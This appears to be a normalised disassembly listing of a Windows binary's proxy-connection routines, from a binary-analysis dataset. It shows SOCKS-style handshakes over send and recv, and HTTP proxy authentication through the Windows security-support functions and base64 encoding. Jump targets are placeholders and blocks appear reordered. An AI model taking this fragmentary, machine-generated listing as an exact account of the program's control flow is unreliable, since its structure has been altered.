lea ecx [ esp + 0x13c ]
push ecx
push 0x0
mov [ esp + 0x34 ] 0x1e
mov [ esp + 0x38 ] 0x0
mov [ esp + 0x144 ] 0x1
mov [ esp + 0x148 ] ebx
call [ select@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
test esi esi
sete al
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x244 ]
mov [ edx ] eax
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x22c
retn
sub_4023e0
sub esp 0x78
push ebp
mov ebp [ esp + 0x80 ]
push esi
xor esi esi
lea eax [ esp + 0x8 ]
push edi
push eax
mov eax [ esp + 0x90 ]
mov ecx ebp
mov [ esp + 0x10 ] r--data
mov [ esp + 0x14 ] 0x9
mov [ esp + 0x18 ] esi
mov [ esp + 0x1c ] esi
mov [ esp + 0x20 ] sub_402730
mov [ esp + 0x24 ] r--data
mov [ esp + 0x28 ] 0x8
mov [ esp + 0x2c ] esi
mov [ esp + 0x30 ] esi
mov [ esp + 0x34 ] sub_402750
mov [ esp + 0x38 ] r--data
mov [ esp + 0x3c ] 0x4
mov [ esp + 0x40 ] esi
mov [ esp + 0x44 ] esi
mov [ esp + 0x48 ] sub_402770
mov [ esp + 0x4c ] r--data
mov [ esp + 0x50 ] 0x6
mov [ esp + 0x54 ] esi
mov [ esp + 0x58 ] esi
mov [ esp + 0x5c ] sub_403060
mov [ esp + 0x60 ] r--data
mov [ esp + 0x64 ] 0x5
mov [ esp + 0x68 ] esi
mov [ esp + 0x6c ] esi
mov [ esp + 0x70 ] sub_403060
mov [ esp + 0x74 ] esi
mov [ esp + 0x78 ] esi
mov [ esp + 0x7c ] esi
mov [ esp + 0x80 ] esi
mov [ esp + 0x84 ] esi
call sub_402550
add esp 0x4
test eax eax
je r-xdata
mov edi [ ebx ]
cmp edi 0xffffffff
je r-xdata
cmp [ esp + 0xc ] esi
je r-xdata
mov [ ebx ] 0xffffffff
push 0x2
push edi
call [ shutdown@IAT ]
push edi
call [ closesocket@IAT ]
lea edi [ esp + 0x1c ]
lea ecx [ ecx ]
pop edi
pop esi
xor eax eax
pop ebp
add esp 0x78
retn
mov ecx [ rw-data ]
push ebp
push esi
push ecx
call [ HeapFree@IAT ]
add edi 0x14
cmp [ edi - 0x10 ] esi
jne r-xdata
mov ecx [ edi - 0x4 ]
mov edx [ edi ]
push ecx
push ebx
call edx
add esp 0x8
sub eax esi
je r-xdata
cmp [ edi - 0x8 ] esi
je r-xdata
cmp ebp esi
je r-xdata
sub eax 0x2
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebp
add esp 0x78
retn
mov eax [ rw-data ]
push ebp
push esi
push eax
call [ HeapFree@IAT ]
cmp ebp esi
je r-xdata
sub_402550
sub esp 0xc
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
mov esi ecx
xor ebx ebx
push edi
mov [ esi + eax ] bl
mov edi r--data
mov eax esi
mov [ esp + 0x14 ] ebx
call sub_401b30
mov [ esp + 0x18 ] eax
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
add esp 0xc
retn
sub esi r--data
mov dl [ edi + 0x1 ]
inc edi
inc esi
test dl dl
jne r-xdata
lea ecx [ ecx ]
mov ecx r--data
test dl dl
je r-xdata
cmp edi [ esp + 0x18 ]
jae r-xdata
movsx eax [ esi + ecx ]
movsx edx dl
sub eax edx
jne r-xdata
mov cl [ edi ]
mov edx edi
mov [ esp + 0x10 ] edi
test cl cl
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc ecx
cmp [ esi + ecx ] al
jne r-xdata
cmp [ edx ] 0xd
jne r-xdata
cmp cl 0xd
je r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
jmp r-xdata
mov [ esp + 0x10 ] edx
mov cl [ edx + 0x1 ]
inc edx
test cl cl
jne r-xdata
mov [ edx ] 0x0
cmp [ ebp ] 0x0
lea esi [ edi + 0x15 ]
je r-xdata
lea esi [ edx + 0x1 ]
jmp r-xdata
lea ecx [ ecx ]
mov [ esp + 0x10 ] edx
mov dl [ esi ]
mov edi esi
test dl dl
je r-xdata
add esi [ ebp + 0x4 ]
mov eax 0x1
mov [ ebp + 0x8 ] eax
cmp [ esi ] 0x0
mov [ esp + 0x14 ] eax
je r-xdata
mov bl [ esi ]
test bl bl
je r-xdata
add ebp 0x14
cmp [ ebp ] 0x0
mov [ esp + 0x20 ] ebp
jne r-xdata
add esi eax
mov [ ebp + 0xc ] esi
xor ecx ecx
mov edx esi
sub edx eax
mov eax [ ebp ]
cmp [ eax ] 0x0
mov edi esi
je r-xdata
mov ebx [ esp + 0x14 ]
cmp [ ecx ] 0x0
je r-xdata
lea ebx [ ebx ]
mov edx [ esp + 0x10 ]
mov ebp [ esp + 0x20 ]
mov ecx edi
jmp r-xdata
mov bl [ edi + 0x1 ]
inc edi
inc edx
test bl bl
jne r-xdata
movsx ebp [ edx + ecx ]
movsx ebx bl
sub ebp ebx
jne r-xdata
cmp ecx esi
jne r-xdata
mov ecx eax
test bl bl
je r-xdata
mov edx [ esp + 0x10 ]
mov ebp [ esp + 0x20 ]
inc ecx
cmp [ edx + ecx ] 0x0
jne r-xdata
mov bl [ ecx ]
test bl bl
je r-xdata
sub_4026a0
push ecx
push ebp
mov ebp [ CryptBinaryToStringA@IAT ]
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x1
push edi
push ebx
call ebp
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
push esi
test eax eax
jne r-xdata
pop ebp
pop ecx
retn
mov ecx [ rw-data ]
add eax 0x4
push eax
push 0x8
push ecx
call [ HeapAlloc@IAT ]
mov esi eax
xor esi esi
jmp r-xdata
cmp [ esi ] 0x0
mov edx esi
mov ecx esi
je r-xdata
test esi esi
je r-xdata
lea edx [ esp + 0x8 ]
push edx
push esi
push 0x1
push edi
push ebx
call ebp
test eax eax
jne r-xdata
mov eax esi
pop esi
mov [ edx ] 0x0
pop ebp
pop ecx
retn
nop
pop esi
xor eax eax
pop ebp
pop ecx
retn
push esi
push eax
mov eax [ rw-data ]
push eax
call [ HeapFree@IAT ]
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
cmp al 0xa
je r-xdata
mov al [ ecx ]
cmp al 0xd
je r-xdata
mov [ edx ] al
inc edx
sub_402790
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x9a4
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x9a0 ] eax
mov eax [ ebp + 0x8 ]
push ebx
lea edx [ esp + 0x1c ]
push esi
mov ebx ecx
mov [ esp + 0x64 ] edx
mov edx 0x2
mov [ esp + 0x8 ] eax
xor eax eax
push edi
mov ecx 0x1
mov [ esp + 0x28 ] edx
mov [ esp + 0x34 ] edx
mov edx [ ebx + 0xc ]
lea esi [ esp + 0x1a8 ]
mov [ esp + 0x14 ] eax
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] ecx
mov [ esp + 0x24 ] eax
mov [ esp + 0x6c ] eax
mov [ esp + 0x70 ] ecx
mov ecx esi
push edx
mov [ esp + 0x30 ] esi
lea eax [ esp + 0x34 ]
push r--data
mov edi 0x100
lea esi [ esp + 0xb0 ]
mov [ esp + 0x28 ] ebx
mov [ esp + 0x7c ] eax
mov [ esp + 0x40 ] ecx
call sub_401c30
add esp 0x8
cmp eax 0xffffffff
je r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x9a0 ]
xor ecx esp
call sub_403072
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
push 0x0
lea edx [ esp + 0x5c ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x2
push eax
push 0x0
call AcquireCredentialsHandleA
test eax eax
jne r-xdata
cmp [ eax ] 0x1
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edx [ ebx + 0x18 ]
xor ecx ecx
mov [ esp + 0x54 ] 0x2
mov [ esp + 0x4c ] edx
test edx edx
je r-xdata
jmp r-xdata
mov edx 0x5c
mov [ esp + 0x50 ] ecx
mov [ esp + 0x44 ] eax
call sub_401840
mov [ esp + 0x3c ] eax
xor ecx ecx
mov [ eax ] cx
mov edx [ esp + 0x3c ]
mov ecx [ esp + 0x44 ]
add edx 0x2
xor eax eax
mov [ esp + 0x3c ] edx
test ecx ecx
je r-xdata
cmp [ edx ] cx
je r-xdata
mov esi [ esp + 0x14 ]
push 0x0
lea ecx [ esp + 0x20 ]
push ecx
lea edx [ esp + 0x74 ]
push edx
lea eax [ esp + 0xac ]
push eax
push 0x0
lea ecx [ esp + 0x74 ]
push ecx
push 0x10
push 0x0
push 0x0
lea edx [ esp + 0xcc ]
push edx
push esi
lea eax [ esp + 0x84 ]
push eax
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x60 ] 0x800
call InitializeSecurityContextA
test eax eax
je r-xdata
mov [ esp + 0x48 ] eax
xor eax eax
test edx edx
je r-xdata
cmp [ ecx ] ax
je r-xdata
lea esp [ esp ]
test esi esi
jne r-xdata
cmp eax 0x90312
jne r-xdata
mov ecx [ esp + 0xc ]
push 0x0
lea edx [ esp + 0x5c ]
push edx
push 0x0
push 0x0
mov [ esp + 0x50 ] eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
push 0x2
push ecx
push 0x0
call AcquireCredentialsHandleA
test eax eax
je r-xdata
cmp [ edx ] ax
je r-xdata
lea ecx [ ecx ]
inc ecx
cmp [ edx + ecx * 2 ] 0x0
jne r-xdata
mov edi [ esp + 0x30 ]
lea ebx [ esp + 0x1a8 ]
call sub_4026a0
mov ebx eax
test ebx ebx
je r-xdata
lea ecx [ esp + 0xa0 ]
mov [ esp + 0x14 ] ecx
sub [ ebp + 0xc ] 0x1
jne r-xdata
inc eax
cmp [ edx + eax * 2 ] 0x0
jne r-xdata
inc eax
cmp [ ecx + eax * 2 ] 0x0
jne r-xdata
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x18 ] 0x2
jmp r-xdata
mov ecx [ rw-data ]
push ebx
push 0x0
push ecx
call [ HeapFree@IAT ]
xor ebx ebx
cmp [ esp + 0x10 ] ebx
je r-xdata
mov eax [ edi + 0xc ]
push eax
mov ax [ edi + 0x10 ]
call sub_401dc0
add esp 0x4
mov [ edi ] eax
cmp eax 0xffffffff
je r-xdata
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x9a0 ]
xor ecx esp
call sub_403072
mov esp ebp
pop ebp
retn
mov dl [ esi ]
mov edi esi
test dl dl
je r-xdata
mov ecx [ rw-data ]
push ebx
push 0x0
push ecx
call [ HeapFree@IAT ]
sub [ esp + 0x18 ] 0x1
jne r-xdata
xor eax eax
mov ecx esi
sub ecx r--data
mov edi [ esp + 0x20 ]
mov ecx [ esp + 0xc ]
lea edx [ esp + 0x10 ]
push edx
push edi
mov eax ebx
call sub_4020b0
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
cmp esi ebx
je r-xdata
lea edx [ esi + 0x9 ]
call sub_401b80
cmp eax 0xc8
je r-xdata
mov dl [ edi + 0x1 ]
inc edi
inc ecx
test dl dl
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
mov edx [ rw-data ]
push esi
push ebx
push edx
call [ HeapFree@IAT ]
jmp r-xdata
cmp esi ebx
je r-xdata
cmp eax 0x197
jne r-xdata
mov eax r--data
test dl dl
je r-xdata
xor ebx ebx
mov eax edi
xor ebx ebx
jmp r-xdata
movsx ebx [ ecx + eax ]
movsx edx dl
sub ebx edx
jne r-xdata
mov ecx [ esp + 0x9ac ]
pop edi
pop esi
pop ebx
xor ecx esp
xor eax eax
call sub_403072
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
push esi
push ebx
push eax
call [ HeapFree@IAT ]
mov ecx [ esp + 0xc ]
mov [ esp + 0x78 ] ecx
call sub_401870
mov [ esp + 0x7c ] eax
lea eax [ esp + 0x78 ]
push eax
mov eax [ esp + 0x14 ]
mov ecx esi
mov [ esp + 0x84 ] ebx
mov [ esp + 0x88 ] ebx
mov [ esp + 0x8c ] ebx
mov [ esp + 0x90 ] ebx
mov [ esp + 0x94 ] ebx
mov [ esp + 0x98 ] ebx
mov [ esp + 0x9c ] ebx
mov [ esp + 0xa0 ] ebx
call sub_402550
add esp 0x4
test eax eax
je r-xdata
cmp eax esi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
cmp [ ecx + eax ] bl
jne r-xdata
mov eax [ esp + 0x84 ]
test eax eax
je r-xdata
push 0x0
push 0x0
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x1b4 ]
push edx
push 0x1
push 0x0
push eax
mov [ esp + 0x40 ] 0x800
call [ CryptStringToBinaryA@IAT ]
push esi
mov edi eax
mov eax [ rw-data ]
push 0x0
push eax
call [ HeapFree@IAT ]
test edi edi
je r-xdata
sub_402bc0
sub esp 0x340
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x33c ] eax
mov eax [ esp + 0x344 ]
push ebx
push ebp
mov ebp [ esp + 0x354 ]
push esi
mov esi edx
mov [ esp + 0x1c ] ecx
movzx ecx [ esi ]
mov [ esp + 0x20 ] eax
push edi
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x2c ] sub_403060
mov [ esp + 0x30 ] 0xff
mov [ esp + 0x34 ] 0x0
mov eax esi
test cx cx
je r-xdata
cmp [ eax ] 0x3a
jne r-xdata
movzx ecx cx
mov edi [ esp + 0x20 ]
xor edx edx
mov [ eax ] dx
lea edx [ eax + 0x2 ]
call sub_4018e0
movzx edi ax
jmp r-xdata
movzx ecx [ eax + 0x2 ]
add eax 0x2
test cx cx
jne r-xdata
push 0x0
push 0x0
push 0x100
lea ecx [ esp + 0x254 ]
push ecx
push eax
push esi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
cmp eax 0x100
jl r-xdata
lea esp [ esp ]
xor eax eax
cmp [ esi ] ax
je r-xdata
cmp cx 0x3a
je r-xdata
mov [ esp + eax + 0x248 ] 0x0
test eax eax
jne r-xdata
xor eax eax
inc eax
cmp [ esi + eax * 2 ] 0x0
jne r-xdata
lea edx [ esp + 0x248 ]
push edx
mov eax edi
call sub_401dc0
add esp 0x4
mov [ esp + 0x14 ] eax
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax 0xffffffff
jmp r-xdata
mov [ esp + 0x140 ] 0x5
mov ebx 0x2
lea ecx [ esp + 0x28 ]
xor al al
mov ecx [ esp + 0x34c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_403072
add esp 0x340
retn
add ecx 0x8
mov [ esp + ebx + 0x140 ] al
mov al [ ecx ]
inc ebx
cmp al 0xff
jne r-xdata
mov edx [ esp + 0x14 ]
push 0x0
push ebx
lea ecx [ esp + 0x148 ]
mov al bl
push ecx
sub al 0x2
push edx
mov [ esp + 0x151 ] al
call [ send@IAT ]
cmp eax ebx
jne r-xdata
mov esi 0x2
lea edi [ esp + 0x140 ]
mov eax [ esp + 0x14 ]
push 0x0
push esi
push edi
push eax
call [ recv@IAT ]
test eax eax
jle r-xdata
sub esi eax
add edi eax
test esi esi
jg r-xdata
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push 0x0
lea edx [ esp + 0x44 ]
push edx
push 0x0
mov [ esp + 0x2c ] 0x1e
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x50 ] eax
call [ select@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
test esi esi
sete al
test eax eax
je r-xdata
mov dl [ esp + 0x141 ]
cmp dl 0xff
je r-xdata
mov esi [ esp + 0x14 ]
push 0x2
push esi
call [ shutdown@IAT ]
push esi
call [ closesocket@IAT ]
mov eax 0xffffffff
jmp r-xdata
lea ecx [ esp + 0x28 ]
xor al al
lea ecx [ ecx ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x14 ]
mov ecx [ ecx + 0x4 ]
push edx
push ebp
push eax
call ecx
add esp 0xc
test eax eax
je r-xdata
mov al [ ecx + 0x8 ]
add ecx 0x8
cmp al 0xff
jne r-xdata
mov esi [ esp + 0x24 ]
mov ebx 0x4
mov [ esp + 0x141 ] 0x1
mov [ esp + 0x142 ] 0x0
xor ebp ebp
cmp al dl
je r-xdata
jmp r-xdata
cmp [ edi ] 0x2e
je r-xdata
mov edi edi
mov edx esi
call sub_401b80
mov ecx edi
sub ecx esi
mov [ esp + ebx + 0x140 ] al
cmp ecx 0xffffffff
jne r-xdata
xor edi edi
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
xor eax eax
cmp [ esi ] 0x2d
sete al
cmp eax ecx
jge r-xdata
xor ecx ecx
cmp [ esi ] cl
je r-xdata
inc ebp
cmp ebp 0x3
jb r-xdata
cmp al 0x2e
je r-xdata
inc ebx
lea esi [ edi + 0x1 ]
mov dl [ eax + esi ]
cmp dl 0x30
jl r-xdata
inc ecx
cmp [ ecx + esi ] 0x0
jne r-xdata
mov al [ esi ]
mov edi esi
test al al
je r-xdata
mov edx esi
call sub_401b80
mov [ esp + ebx + 0x140 ] al
cmp ebp 0x3
jne r-xdata
cmp dl 0x39
jg r-xdata
mov ecx [ esp + 0x24 ]
xor eax eax
mov [ esp + 0x143 ] 0x3
test ecx ecx
je r-xdata
sub edi esi
mov edx edi
cmp edx 0xffffffff
jne r-xdata
inc eax
cmp eax ecx
jl r-xdata
movzx edx al
push edx
mov [ esp + 0x148 ] al
push ecx
lea eax [ esp + 0x14d ]
push eax
call sub_401ca0
movzx esi [ esp + 0x144 ]
add esi 0x5
cmp [ ecx ] al
je r-xdata
xor eax eax
cmp [ esi ] 0x2d
sete al
cmp eax edx
jge r-xdata
xor eax eax
test esi esi
je r-xdata
mov ebp [ recv@IAT ]
mov esi 0xa
lea edi [ esp + 0x140 ]
lea esp [ esp ]
inc eax
cmp [ ecx + eax ] 0x0
jne r-xdata
mov [ esp + 0x143 ] 0x1
mov esi 0x8
jmp r-xdata
lea esp [ esp ]
mov edx eax
cmp [ esi ] al
je r-xdata
push 0x0
push esi
push edi
push ebx
call ebp
test eax eax
jle r-xdata
mov ax [ esp + 0x358 ]
mov ebx [ esp + 0x14 ]
rol ax 0x8
push 0x0
mov [ esp + esi + 0x144 ] ax
add esi 0x2
push esi
lea ecx [ esp + 0x148 ]
push ecx
push ebx
call [ send@IAT ]
cmp eax esi
jne r-xdata
cmp cl 0x39
jg r-xdata
inc eax
cmp [ eax + esi ] 0x0
jne r-xdata
sub esi eax
add edi eax
test esi esi
jg r-xdata
inc eax
cmp eax edx
jl r-xdata
lea edx [ esp + 0x18 ]
push edx
push 0x0
push 0x0
lea eax [ esp + 0x44 ]
push eax
push 0x0
mov [ esp + 0x2c ] 0x1e
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x50 ] ebx
call [ select@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
test esi esi
sete al
test eax eax
je r-xdata
mov cl [ eax + esi ]
cmp cl 0x30
jl r-xdata
cmp [ esp + 0x141 ] 0x0
jne r-xdata
movzx eax [ esp + 0x143 ]
sub eax 0x1
je r-xdata
mov eax ebx
sub eax 0x2
je r-xdata
movzx esi [ esp + 0x144 ]
sub esi 0x4
lea edi [ esp + 0x14a ]
mov edi edi
push 0x0
push esi
push edi
push ebx
call ebp
test eax eax
jle r-xdata
sub esi eax
add edi eax
test esi esi
jg r-xdata
lea ecx [ esp + 0x18 ]
push ecx
push 0x0
push 0x0
lea edx [ esp + 0x44 ]
push edx
push 0x0
mov [ esp + 0x2c ] 0x1e
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x50 ] ebx
call [ select@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
test esi esi
sete al
test eax eax
jne r-xdata
sub_403081
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_403187
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_403187
pop ecx
sub_401870
xor eax eax
test ecx ecx
je r-xdata
retn
cmp [ ecx ] al
je r-xdata
lea ebx [ ebx ]
inc eax
cmp [ eax + ecx ] 0x0
jne r-xdata
sub_401c80
test eax eax
je r-xdata
retn
push eax
mov eax [ rw-data ]
push 0x0
push eax
call [ HeapFree@IAT ]
sub_401cc0
push eax
push edi
push ecx
mov al [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
[ edi ]
pop ecx
pop edi
pop eax
retn 0xc
sub_402730
mov ecx [ esp + 0x4 ]
push 0x2
push r--data
call sub_402790
add esp 0x8
retn
sub_402750
mov ecx [ esp + 0x4 ]
push 0x1
push r--data
call sub_402790
add esp 0x8
retn
sub_402770
mov ecx [ esp + 0x4 ]
push 0x2
push r--data
call sub_402790
add esp 0x8
retn
sub_403060
mov eax 0x1
retn
AcquireCredentialsHandleA
jmp [ AcquireCredentialsHandleA@IAT ]
InitializeSecurityContextA
jmp [ InitializeSecurityContextA@IAT ]
sub_403072
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_403081
retn
sub_403187
and [ rw-data ] 0x0
retn
